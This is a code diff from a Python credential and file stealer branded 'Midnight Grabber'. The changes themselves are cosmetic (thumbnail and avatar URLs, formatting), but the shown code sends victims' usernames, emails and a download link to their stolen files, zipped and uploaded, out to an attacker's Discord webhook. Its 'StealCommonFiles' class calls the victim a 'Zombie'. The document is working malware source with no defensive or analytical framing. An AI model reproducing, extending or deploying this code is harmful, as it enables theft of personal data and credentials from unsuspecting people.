@@ -886,7 +886,7 @@ class Main:
                 "url" : "",
                 "color": 0,
                 "footer": {"text": "https://guns.lol/247msn | Midnight Grabber"},
-                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
+                "thumbnail": {"url": "https://i.imgur.com/y524ww8.png"}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
                 {"name": "Email", "value": "``" + email + "``", "inline": True},
@@ -1098,7 +1098,7 @@ class Main:
                 "url" : "",
                 "color": 0,
                 "footer": {"text": "https://guns.lol/247msn | Midnight Grabber"},
-                "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
+                "thumbnail": {"url": "https://i.imgur.com/y524ww8.png"}}
             fields = [
                 {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
                 {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
@@ -2025,15 +2025,18 @@ class StealCommonFiles:
                     embed_data2 = {
                             "title": "**Midnight Grabber**",
                             "description": f"**Zombie Username $ __{os.getenv('USERNAME')}__**",
-                            "url" : "",
+                            "url": "",
                             "color": 0,
                             "footer": {"text": "https://guns.lol/247msn | Midnight Grabber"},
-                            "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
+                            "thumbnail": {"url": "https://i.imgur.com/y524ww8.png"},
+                            "avatar_url": "https://i.imgur.com/y524ww8.png"  # Add avatar_url to set the profile picture
+                    }
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                                "username": "Midnight | https://guns.lol/247msn",
-                                "embeds": [embed_data2] }
+                        "username": "Midnight | https://guns.lol/247msn",
+                        "embeds": [embed_data2]
+                    }
                     async with session.post(webhook, json=payload2) as req:
                         pass
             try:
